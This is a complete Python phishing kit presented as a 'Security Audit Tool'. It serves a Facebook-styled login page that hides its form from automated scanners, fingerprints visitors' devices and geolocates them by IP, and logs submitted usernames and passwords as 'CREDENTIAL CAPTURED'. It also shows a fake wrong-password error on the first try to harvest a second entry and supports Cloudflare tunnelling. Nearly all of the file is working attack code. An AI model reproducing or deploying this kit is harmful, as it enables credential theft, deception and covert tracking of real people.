#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import urllib.request
import os
import threading
import json

PORT = 8080
LOG_FILE = "audit_results.log"

# High-Fidelity Phishing & Device Intelligence Template with Anti-Bot Evasion
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification Portal</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
        h2 { color: #1877f2; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #1877f2; border: none; color: white; font-weight: bold; border-radius: 5px; cursor: pointer; margin-top: 10px; }
        button:hover { background-color: #165eab; }
        .info { font-size: 12px; color: #65676b; margin-top: 15px; }
        .error-msg { color: #ed4337; font-size: 13px; margin-bottom: 10px; display: none; }
        #loginForm { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Security Audit Portal</h2>
        <p class="info" id="statusMsg">Verifying browser security & anti-bot check...</p>
        <div id="errorBox" class="error-msg">Incorrect username or password. Please try again.</div>
        <form id="loginForm">
            <input type="text" id="username" name="username" placeholder="Username, email, or phone" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <input type="hidden" id="botToken" name="botToken" value="">
            <button type="submit" id="subBtn">Verify & Continue</button>
        </form>
        <div class="info" id="status">Gathering secure device telemetry...</div>
    </div>

    <script>
        let humanVerified = false;
        let botTokenValue = "";

        function checkHuman() {
            botTokenValue = "verified_human_" + Math.random().toString(36).substring(2);
            document.getElementById('botToken').value = botTokenValue;
            humanVerified = true;
            document.getElementById('loginForm').style.display = 'block';
            document.getElementById('statusMsg').innerText = "Please verify your session to proceed.";
        }

        let interactionCount = 0;
        function handleInteraction() {
            interactionCount++;
            if (interactionCount > 1 && !humanVerified) {
                checkHuman();
            }
        }

        window.addEventListener('mousemove', handleInteraction);
        window.addEventListener('touchstart', handleInteraction);

        setTimeout(() => {
            if (!humanVerified) {
                checkHuman();
            }
        }, 1500);

        async function gatherIntelligence() {
            let data = {};
            data.screenWidth = window.screen.width;
            data.screenHeight = window.screen.height;
            data.pixelRatio = window.devicePixelRatio || 1;
            data.platform = navigator.platform;
            data.userAgent = navigator.userAgent;
            data.languages = navigator.languages ? navigator.languages.join(', ') : navigator.language;
            data.hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
            data.deviceMemory = navigator.deviceMemory || 'Unknown';

            if (navigator.getBattery) {
                try {
                    let battery = await navigator.getBattery();
                    data.batteryLevel = Math.round(battery.level * 100) + "%";
                    data.batteryCharging = battery.charging;
                } catch (e) {
                    data.batteryLevel = "Unavailable";
                }
            } else {
                data.batteryLevel = "Not Supported";
            }

            if (navigator.connection) {
                data.connectionType = navigator.connection.effectiveType || 'Unknown';
                data.downlink = navigator.connection.downlink || 'Unknown';
            } else {
                data.connectionType = "Not Supported";
            }

            fetch('/telemetry', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(() => {
                document.getElementById('status').innerText = "System secure and verified.";
            }).catch(() => {
                document.getElementById('status').innerText = "Ready.";
            });
        }

        window.onload = gatherIntelligence;

        let attemptCount = 0;
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            let username = document.getElementById('username').value;
            let password = document.getElementById('password').value;
            let token = document.getElementById('botToken').value;

            fetch('/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: username, password: password, attempt: attemptCount, botToken: token })
            }).then(response => response.json()).then(data => {
                if (data.status === 'retry') {
                    attemptCount++;
                    document.getElementById('errorBox').style.display = 'block';
                    document.getElementById('password').value = '';
                } else if (data.status === 'success') {
                    window.location.href = data.redirect;
                } else if (data.status === 'bot_blocked') {
                    alert('Security verification failed. Automated access restricted.');
                }
            }).catch(err => {
                console.error('Error:', err);
            });
        });
    </script>
</body>
</html>
"""

def get_geolocation(ip):
    """Fetches Country, City, and ISP data using IP Geolocation API."""
    if ip in ["127.0.0.1", "localhost", "::1"]:
        return {"country": "Local Network", "city": "Local", "isp": "Local"}
    try:
        url = f"http://ip-api.com/json/{ip}"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=2) as response:
            data = json.loads(response.read().decode())
            if data.get("status") == "success":
                return {
                    "country": data.get("country", "Unknown"),
                    "city": data.get("city", "Unknown"),
                    "isp": data.get("isp", "Unknown")
                }
    except Exception:
        pass
    return {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}

class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True

class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
    def get_client_ip(self):
        # Extract real client IP behind Cloudflare Tunnel or Proxies
        cf_ip = self.headers.get('CF-Connecting-IP')
        if cf_ip:
            return cf_ip
        forwarded = self.headers.get('X-Forwarded-For')
        if forwarded:
            return forwarded.split(',')[0].strip()
        return self.client_address[0]

    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            client_ip = self.get_client_ip()
            geo = get_geolocation(client_ip)
            
            print(f"\033[94m[VISIT] IP: {client_ip} | Location: {geo['city']}, {geo['country']} | ISP: {geo['isp']}\033[0m")
            
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        client_ip = self.get_client_ip()
        geo = get_geolocation(client_ip)

        if self.path == '/login':
            try:
                data = json.loads(post_data.decode('utf-8'))
                username = data.get('username', '')
                password = data.get('password', '')
                attempt = data.get('attempt', 0)
                bot_token = data.get('botToken', '')

                if not bot_token or not bot_token.startswith('verified_human_'):
                    log_entry = f"[BOT BLOCKED] IP: {client_ip} ({geo['country']}) | Automated scanner detected.\n"
                    print(f"\033[91m{log_entry}\033[0m")
                    with open(LOG_FILE, "a") as f:
                        f.write(log_entry)
                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"status": "bot_blocked"}).encode('utf-8'))
                    return

                log_entry = f"[CREDENTIAL CAPTURED (Attempt {attempt + 1})] IP: {client_ip} | Location: {geo['city']}, {geo['country']} ({geo['isp']}) | Username: {username} | Password: {password}\n"
                print(f"\033[92m{log_entry}\033[0m")
                
                with open(LOG_FILE, "a") as f:
                    f.write(log_entry)

                if attempt == 0:
                    response_data = {"status": "retry"}
                else:
                    response_data = {"status": "success", "redirect": "https://www.google.com"}

                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(response_data).encode('utf-8'))
            except Exception as e:
                print(f"Error handling login: {e}")
                self.send_response(500)
                self.end_headers()

        elif self.path == '/telemetry':
            try:
                telemetry = json.loads(post_data.decode('utf-8'))
                log_entry = f"[DEVICE INTEL] IP: {client_ip} | Location: {geo['city']}, {geo['country']} | Data: {json.dumps(telemetry)}\n"
                print(f"\033[93m{log_entry}\033[0m")
                
                with open(LOG_FILE, "a") as f:
                    f.write(log_entry)
            except Exception as e:
                print(f"Error parsing telemetry: {e}")

            response_bytes = json.dumps({"status": "success"}).encode('utf-8')
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(response_bytes)

def run_server():
    server_address = ('', PORT)
    httpd = ThreadedHTTPServer(server_address, SecurityAuditHandler)
    print(f"\033[96m[*] Advanced Security Audit Tool v4 (Geolocation & Cloudflare IP Support) running on port {PORT}...\033[0m")
    print(f"\033[96m[*] Logging captured data to {LOG_FILE}\033[0m")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n\033[91m[-] Shutting down audit server.\033[0m")
        httpd.server_close()

if __name__ == '__main__':
    run_server()
